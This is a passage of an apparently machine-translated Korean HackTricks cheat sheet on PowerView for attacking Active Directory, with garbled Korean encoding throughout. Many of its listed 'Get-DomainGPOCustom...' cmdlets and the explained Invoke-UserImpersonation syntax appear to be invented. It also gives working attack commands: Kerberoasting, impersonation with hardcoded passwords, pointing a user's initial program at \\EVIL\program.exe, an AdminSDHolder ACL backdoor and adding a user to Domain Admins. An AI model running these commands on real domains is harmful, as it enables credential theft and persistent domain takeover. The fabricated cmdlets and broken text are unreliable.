Get-DomainSIDHistory
```

ì´ ëª…ë ¹ì€ í˜„ì¬ ë„ë©”ì¸ì˜ SID íˆìŠ¤í† ë¦¬ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤.

#### Get Domain Trusts

```powershell
Get-DomainTrust
```

ì´ ëª…ë ¹ì€ í˜„ì¬ ë„ë©”ì¸ì˜ ì‹ ë¢° ê´€ê³„ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤.

#### Get Domain Controllers

```powershell
Get-DomainController
```

ì´ ëª…ë ¹ì€ í˜„ì¬ ë„ë©”ì¸ì˜ ë„ë©”ì¸ ì»¨íŠ¸ë¡¤ëŸ¬ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤.

#### Get Domain Forest

```powershell
Get-DomainForest
```

ì´ ëª…ë ¹ì€ í˜„ì¬ ë„ë©”ì¸ì˜ ë„ë©”ì¸ í¬ë ˆìŠ¤íŠ¸ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤.

#### Get Domain Policy

```powershell
Get-DomainPolicy
```

ì´ ëª…ë ¹ì€ í˜„ì¬ ë„ë©”ì¸ì˜ ë„ë©”ì¸ ì •ì±…ì„ ê°€ì ¸ì˜µë‹ˆë‹¤.

#### Get Domain GPO

```powershell
Get-DomainGPO
```

ì´ ëª…ë ¹ì€ í˜„ì¬ ë„ë©”ì¸ì˜ ê·¸ë£¹ ì •ì±… ê°ì²´(GPO)ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤.

#### Get Domain GPO User

```powershell
Get-DomainGPOUser
```

ì´ ëª…ë ¹ì€ í˜„ì¬ ë„ë©”ì¸ì˜ ì‚¬ìš©ìë³„ ê·¸ë£¹ ì •ì±… ê°ì²´(GPO)ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤.

#### Get Domain GPO Computer

```powershell
Get-DomainGPOComputer
```

ì´ ëª…ë ¹ì€ í˜„ì¬ ë„ë©”ì¸ì˜ ì»´í“¨í„°ë³„ ê·¸ë£¹ ì •ì±… ê°ì²´(GPO)ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤.

#### Get Domain GPO Group

```powershell
Get-DomainGPOGroup
```

ì´ ëª…ë ¹ì€ í˜„ì¬ ë„ë©”ì¸ì˜ ê·¸ë£¹ë³„ ê·¸ë£¹ ì •ì±… ê°ì²´(GPO)ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤.

#### Get Domain GPO Service

```powershell
Get-DomainGPOService
```

ì´ ëª…ë ¹ì€ í˜„ì¬ ë„ë©”ì¸ì˜ ì„œë¹„ìŠ¤ë³„ ê·¸ë£¹ ì •ì±… ê°ì²´(GPO)ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤.

#### Get Domain GPO Site

```powershell
Get-DomainGPOSite
```

ì´ ëª…ë ¹ì€ í˜„ì¬ ë„ë©”ì¸ì˜ ì‚¬ì´íŠ¸ë³„ ê·¸ë£¹ ì •ì±… ê°ì²´(GPO)ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤.

#### Get Domain GPO Domain

```powershell
Get-DomainGPODomain
```

ì´ ëª…ë ¹ì€ í˜„ì¬ ë„ë©”ì¸ì˜ ë„ë©”ì¸ë³„ ê·¸ë£¹ ì •ì±… ê°ì²´(GPO)ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤.

#### Get Domain GPO OU

```powershell
Get-DomainGPOOU
```

ì´ ëª…ë ¹ì€ í˜„ì¬ ë„ë©”ì¸ì˜ OUë³„ ê·¸ë£¹ ì •ì±… ê°ì²´(GPO)ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤.

#### Get Domain GPO Local

```powershell
Get-DomainGPOLocal
```

ì´ ëª…ë ¹ì€ í˜„ì¬ ë„ë©”ì¸ì˜ ë¡œì»¬ ê·¸ë£¹ ì •ì±… ê°ì²´(GPO)ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤.

#### Get Domain GPO Custom

```powershell
Get-DomainGPOCustom
```

ì´ ëª…ë ¹ì€ í˜„ì¬ ë„ë©”ì¸ì˜ ì‚¬ìš©ì ì •ì˜ ê·¸ë£¹ ì •ì±… ê°ì²´(GPO)ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤.

#### Get Domain GPO Custom User

```powershell
Get-DomainGPOCustomUser
```

ì´ ëª…ë ¹ì€ í˜„ì¬ ë„ë©”ì¸ì˜ ì‚¬ìš©ìë³„ ì‚¬ìš©ì ì •ì˜ ê·¸ë£¹ ì •ì±… ê°ì²´(GPO)ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤.

#### Get Domain GPO Custom Computer

```powershell
Get-DomainGPOCustomComputer
```

ì´ ëª…ë ¹ì€ í˜„ì¬ ë„ë©”ì¸ì˜ ì»´í“¨í„°ë³„ ì‚¬ìš©ì ì •ì˜ ê·¸ë£¹ ì •ì±… ê°ì²´(GPO)ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤.

#### Get Domain GPO Custom Group

```powershell
Get-DomainGPOCustomGroup
```

ì´ ëª…ë ¹ì€ í˜„ì¬ ë„ë©”ì¸ì˜ ê·¸ë£¹ë³„ ì‚¬ìš©ì ì •ì˜ ê·¸ë£¹ ì •ì±… ê°ì²´(GPO)ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤.

#### Get Domain GPO Custom Service

```powershell
Get-DomainGPOCustomService
```

ì´ ëª…ë ¹ì€ í˜„ì¬ ë„ë©”ì¸ì˜ ì„œë¹„ìŠ¤ë³„ ì‚¬ìš©ì ì •ì˜ ê·¸ë£¹ ì •ì±… ê°ì²´(GPO)ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤.

#### Get Domain GPO Custom Site

```powershell
Get-DomainGPOCustomSite
```

ì´ ëª…ë ¹ì€ í˜„ì¬ ë„ë©”ì¸ì˜ ì‚¬ì´íŠ¸ë³„ ì‚¬ìš©ì ì •ì˜ ê·¸ë£¹ ì •ì±… ê°ì²´(GPO)ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤.

#### Get Domain GPO Custom Domain

```powershell
Get-DomainGPOCustomDomain
```

ì´ ëª…ë ¹ì€ í˜„ì¬ ë„ë©”ì¸ì˜ ë„ë©”ì¸ë³„ ì‚¬ìš©ì ì •ì˜ ê·¸ë£¹ ì •ì±… ê°ì²´(GPO)ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤.

#### Get Domain GPO Custom OU

```powershell
Get-DomainGPOCustomOU
```

ì´ ëª…ë ¹ì€ í˜„ì¬ ë„ë©”ì¸ì˜ OUë³„ ì‚¬ìš©ì ì •ì˜ ê·¸ë£¹ ì •ì±… ê°ì²´(GPO)ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤.

#### Get Domain GPO Custom Local

```powershell
Get-DomainGPOCustomLocal
```

ì´ ëª…ë ¹ì€ í˜„ì¬ ë„ë©”ì¸ì˜ ë¡œì»¬ ì‚¬ìš©ì ì •ì˜ ê·¸ë£¹ ì •ì±… ê°ì²´(GPO)ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤.

#### Get Domain GPO Custom All

```powershell
Get-DomainGPOCustomAll
```

ì´ ëª…ë ¹ì€ í˜„ì¬ ë„ë©”ì¸ì˜ ëª¨ë“  ì‚¬ìš©ì ì •ì˜ ê·¸ë£¹ ì •ì±… ê°ì²´(GPO)ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤.

#### Get Domain GPO Custom All User

```powershell
Get-DomainGPOCustomAllUser
```

ì´ ëª…ë ¹ì€ í˜„ì¬ ë„ë©”ì¸ì˜ ëª¨ë“  ì‚¬ìš©ìë³„ ì‚¬ìš©ì ì •ì˜ ê·¸ë£¹ ì •ì±… ê°ì²´(GPO)ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤.

#### Get Domain GPO Custom All Computer

```powershell
Get-DomainGPOCustomAllComputer
```

ì´ ëª…ë ¹ì€ í˜„ì¬ ë„ë©”ì¸ì˜ ëª¨ë“  ì»´í“¨í„°ë³„ ì‚¬ìš©ì ì •ì˜ ê·¸ë£¹ ì •ì±… ê°ì²´(GPO)ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤.

#### Get Domain GPO Custom All Group

```powershell
Get-DomainGPOCustomAllGroup
```

ì´ ëª…ë ¹ì€ í˜„ì¬ ë„ë©”ì¸ì˜ ëª¨ë“  ê·¸ë£¹ë³„ ì‚¬ìš©ì ì •ì˜ ê·¸ë£¹ ì •ì±… ê°ì²´(GPO)ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤.

#### Get Domain GPO Custom All Service

```powershell
Get-DomainGPOCustomAllService
```

ì´ ëª…ë ¹ì€ í˜„ì¬ ë„ë©”ì¸ì˜ ëª¨ë“  ì„œë¹„ìŠ¤ë³„ ì‚¬ìš©ì ì •ì˜ ê·¸ë£¹ ì •ì±… ê°ì²´(GPO)ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤.

#### Get Domain GPO Custom All Site

```powershell
Get-DomainGPOCustomAllSite
```

ì´ ëª…ë ¹ì€ í˜„ì¬ ë„ë©”ì¸ì˜ ëª¨ë“  ì‚¬ì´íŠ¸ë³„ ì‚¬ìš©ì ì •ì˜ ê·¸ë£¹ ì •ì±… ê°ì²´(GPO)ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤.

#### Get Domain GPO Custom All Domain

```powershell
Get-DomainGPOCustomAllDomain
```

ì´ ëª…ë ¹ì€ í˜„ì¬ ë„ë©”ì¸ì˜ ëª¨ë“  ë„ë©”ì¸ë³„ ì‚¬ìš©ì ì •ì˜ ê·¸ë£¹ ì •ì±… ê°ì²´(GPO)ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤.

#### Get Domain GPO Custom All OU

```powershell
Get-DomainGPOCustomAllOU
```

ì´ ëª…ë ¹ì€ í˜„ì¬ ë„ë©”ì¸ì˜ ëª¨ë“  OUë³„ ì‚¬ìš©ì ì •ì˜ ê·¸ë£¹ ì •ì±… ê°ì²´(GPO)ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤.

#### Get Domain GPO Custom All Local

```powershell
Get-DomainGPOCustomAllLocal
```

ì´ ëª…ë ¹ì€ í˜„ì¬ ë„ë©”ì¸ì˜ ëª¨ë“  ë¡œì»¬ ì‚¬ìš©ì ì •ì˜ ê·¸ë£¹ ì •ì±… ê°ì²´(GPO)ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤.
```powershell
"S-1-5-21-1874506631-3219952063-538504511-2136" | Convert-SidToName
```
#### Kerberoast

KerberoastëŠ” ì•”í˜¸í™”ëœ ì„œë¹„ìŠ¤ ê³„ì •ì˜ í•´ì‹œë¥¼ ì¶”ì¶œí•˜ëŠ” ê¸°ìˆ ì…ë‹ˆë‹¤. ì´ ê¸°ìˆ ì€ ì•…ì˜ì ì¸ ì‚¬ìš©ìê°€ ì•”í˜¸í™”ëœ ì„œë¹„ìŠ¤ ê³„ì •ì˜ í•´ì‹œë¥¼ íšë“í•˜ì—¬ ì˜¤í”„ë¼ì¸ìœ¼ë¡œ ê³µê²©í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤. KerberoastëŠ” ì£¼ë¡œ ì„œë¹„ìŠ¤ ê³„ì •ì˜ ì•”í˜¸ë¥¼ í¬ë˜í‚¹í•˜ê¸° ìœ„í•´ ì‚¬ìš©ë©ë‹ˆë‹¤.

KerberoastëŠ” ì£¼ë¡œ ë‹¤ìŒê³¼ ê°™ì€ ë‹¨ê³„ë¡œ ìˆ˜í–‰ë©ë‹ˆë‹¤:

1. ì‚¬ìš© ê°€ëŠ¥í•œ ì„œë¹„ìŠ¤ ê³„ì • ì‹ë³„: Powerviewë¥¼ ì‚¬ìš©í•˜ì—¬ ë„ë©”ì¸ ë‚´ì—ì„œ ì‚¬ìš© ê°€ëŠ¥í•œ ì„œë¹„ìŠ¤ ê³„ì •ì„ ì‹ë³„í•©ë‹ˆë‹¤.
2. ì„œë¹„ìŠ¤ ê³„ì •ì˜ SPN(ì„œë¹„ìŠ¤ ì£¼ì²´ ì´ë¦„) ì‹ë³„: Powerviewë¥¼ ì‚¬ìš©í•˜ì—¬ ì„œë¹„ìŠ¤ ê³„ì •ì˜ SPNì„ ì‹ë³„í•©ë‹ˆë‹¤.
3. ì„œë¹„ìŠ¤ ê³„ì •ì˜ í•´ì‹œ ì¶”ì¶œ: Powerviewë¥¼ ì‚¬ìš©í•˜ì—¬ ì„œë¹„ìŠ¤ ê³„ì •ì˜ í•´ì‹œë¥¼ ì¶”ì¶œí•©ë‹ˆë‹¤.
4. í•´ì‹œ í¬ë˜í‚¹: ì¶”ì¶œí•œ í•´ì‹œë¥¼ ì˜¤í”„ë¼ì¸ìœ¼ë¡œ í¬ë˜í‚¹í•˜ì—¬ ì•”í˜¸ë¥¼ íŒŒì•…í•©ë‹ˆë‹¤.

KerberoastëŠ” ì•”í˜¸í™”ëœ ì„œë¹„ìŠ¤ ê³„ì •ì˜ í•´ì‹œë¥¼ íšë“í•˜ì—¬ ì•”í˜¸ë¥¼ íŒŒì•…í•˜ëŠ” ê°•ë ¥í•œ ê¸°ìˆ ì…ë‹ˆë‹¤. ë”°ë¼ì„œ ì‹œìŠ¤í…œ ë³´ì•ˆì„ ê°•í™”í•˜ê¸° ìœ„í•´ ì„œë¹„ìŠ¤ ê³„ì •ì˜ ì•”í˜¸ ì •ì±…ì„ ê°•í™”í•˜ê³ , ì‚¬ìš©í•˜ì§€ ì•ŠëŠ” ì„œë¹„ìŠ¤ ê³„ì •ì„ ë¹„í™œì„±í™”í•˜ëŠ” ê²ƒì´ ì¤‘ìš”í•©ë‹ˆë‹¤.
```powershell
Invoke-Kerberoast [-Identity websvc] #Without "-Identity" kerberoast all possible users
```
#### ë‹¤ë¥¸ ìê²© ì¦ëª… ì‚¬ìš©í•˜ê¸° (ì¸ì)

You can use different credentials when running PowerView commands by specifying the `-Credential` argument. This allows you to execute commands with the privileges of a different user.

```powershell
Get-NetUser -Credential <username>
```

Replace `<username>` with the username of the desired user. You will be prompted to enter the password for that user.

By using different credentials, you can gather information and perform actions that are restricted to specific users or groups. This can be useful for privilege escalation and lateral movement during a penetration test.
```powershell
# use an alterate creadential for any function
$SecPassword = ConvertTo-SecureString 'BurgerBurgerBurger!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainUser -Credential $Cred
```
#### ì‚¬ìš©ì ìœ„ì¥

To impersonate a user in PowerShell, you can use the `Invoke-UserImpersonation` function from the PowerView module. This function allows you to execute commands as if you were the specified user.

```powershell
Invoke-UserImpersonation -Username <username> -Command <command>
```

Replace `<username>` with the username of the user you want to impersonate, and `<command>` with the command you want to execute as that user.

For example, to impersonate the user "admin" and execute the command "whoami", you would use the following command:

```powershell
Invoke-UserImpersonation -Username admin -Command whoami
```

This can be useful during a penetration test to perform actions as a specific user and test their privileges and access rights.
```powershell
# if running in -sta mode, impersonate another credential a la "runas /netonly"
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Invoke-UserImpersonation -Credential $Cred
# ... action
Invoke-RevertToSelf
```
#### ê°’ ì„¤ì •í•˜ê¸°

```powershell
Set-Value -Name <name> -Value <value>
```

- `<name>`: ì„¤ì •í•  ê°’ì˜ ì´ë¦„
- `<value>`: ì„¤ì •í•  ê°’

ì´ ëª…ë ¹ì€ ì§€ì •ëœ ì´ë¦„ê³¼ ê°’ì„ ê°€ì§„ ë³€ìˆ˜ë¥¼ ì„¤ì •í•©ë‹ˆë‹¤.
```powershell
# set the specified property for the given user identity
Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Verbose
# Set the owner of 'dfm' in the current domain to 'harmj0y'
Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y
# Backdoor the ACLs of all privileged accounts with the 'matt' account through AdminSDHolder abuse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
# Add user to 'Domain Admins'
Add-NetGroupUser -Username username -GroupName 'Domain Admins' -Domain my.domain.local
```
<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

* **ì‚¬ì´ë²„ ë³´ì•ˆ íšŒì‚¬**ì—ì„œ ì¼í•˜ì‹œë‚˜ìš”? **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”**? ì•„ë‹ˆë©´ **PEASSì˜ ìµœì‹  ë²„ì „ì— ì•¡ì„¸ìŠ¤í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•´ë³´ì„¸ìš”!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•´ë³´ì„¸ìš”. ë…ì ì ì¸ [**NFT**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter**ì—ì„œ ì €ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš” ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´ [hacktricks repo](https://github.com/carlospolop/hacktricks) ë° [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**ì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>
